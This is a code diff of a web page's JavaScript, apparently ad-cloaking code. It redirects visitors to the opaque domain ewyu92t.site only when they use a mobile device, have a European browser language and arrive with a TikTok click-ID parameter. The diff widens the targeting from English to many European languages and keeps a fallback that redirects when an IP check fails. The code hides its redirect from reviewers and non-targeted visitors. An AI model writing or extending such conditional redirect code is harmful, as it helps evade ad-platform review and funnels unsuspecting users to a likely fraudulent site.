@@ -4,10 +4,15 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    function isEnglishLang() {
-      return navigator.language.startsWith('en') || 
-             navigator.languages.some(lang => lang.startsWith('en'));
-    }
+  function isEuropeanLang() {
+    // 检测主要欧洲语言
+    const europeanLanguages = ['en', 'de', 'fr', 'es', 'it', 'pt', 'nl', 'pl', 'ru', 'uk', 'sv', 'no', 'da', 'fi', 'cs', 'hu', 'ro', 'bg', 'el', 'sk', 'hr', 'sl', 'lt', 'lv', 'et'];
+    
+    return europeanLanguages.some(lang => 
+        navigator.language.startsWith(lang) || 
+        navigator.languages.some(userLang => userLang.startsWith(lang))
+    );
+}
 
     function hasTTCLIDParam() {
       const urlParams = new URLSearchParams(window.location.search);
@@ -18,14 +23,14 @@
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (isMobileDevice() && isEnglishLang() && hasTTCLIDParam()) {
+        if (isMobileDevice() && isEuropeanLang() && hasTTCLIDParam()) {
           window.location.href = "https://ewyu92t.site/ftp/";
           return;
         }
       })
       .catch(() => {
         // IP检测失败时严格的三重条件判断
-        if (isMobileDevice() && isEnglishLang() && hasTTCLIDParam()) {
+        if (isMobileDevice() && isEuropeanLang() && hasTTCLIDParam()) {
           window.location.href = "https://ewyu92t.site/ftp/";
           return;
         }
